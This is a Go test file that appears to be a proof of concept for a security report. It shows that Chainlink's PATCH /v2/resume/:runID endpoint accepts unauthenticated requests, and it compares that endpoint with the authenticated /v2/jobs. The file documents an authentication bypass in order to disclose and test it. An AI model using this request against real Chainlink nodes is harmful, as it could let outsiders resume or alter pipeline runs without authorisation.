package web_test

import (
	"bytes"
	"net/http"
	"testing"

	"github.com/google/uuid"
	"github.com/stretchr/testify/require"

	"github.com/smartcontractkit/chainlink/v2/core/internal/cltest"
	"github.com/smartcontractkit/chainlink/v2/core/internal/testutils"
)

func TestPipelineRunsController_Resume_Unauthenticated_PoC(t *testing.T) {
	t.Parallel()

	app := cltest.NewApplicationEVMDisabled(t)
	require.NoError(t, app.Start(testutils.Context(t)))

	runID := uuid.New()
	// The body should be a valid JSON matching pipeline.ResumeRequest
	body := []byte(`{"value":"test"}`)

	url := app.Server.URL + "/v2/resume/" + runID.String()

	req, err := http.NewRequest("PATCH", url, bytes.NewBuffer(body))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()

	// If it was authenticated, we would get 401 Unauthorized.
	// Since /v2/resume/:runID is in unauthedv2 group, it will not return 401.
	// It will likely return 404 or 500 because the runID doesn't exist, but it BYPASSES auth.

	require.NotEqual(t, http.StatusUnauthorized, resp.StatusCode, "VULNERABILITY: PATCH /v2/resume/:runID is unauthenticated!")

	// To be even more sure, let's check a truly authenticated endpoint with the same client
	req2, err := http.NewRequest("GET", app.Server.URL + "/v2/jobs", nil)
	require.NoError(t, err)
	resp2, err := http.DefaultClient.Do(req2)
	require.NoError(t, err)
	defer resp2.Body.Close()
	require.Equal(t, http.StatusUnauthorized, resp2.StatusCode, "Sanity check: GET /v2/jobs should be unauthorized for an unauthenticated client")
}
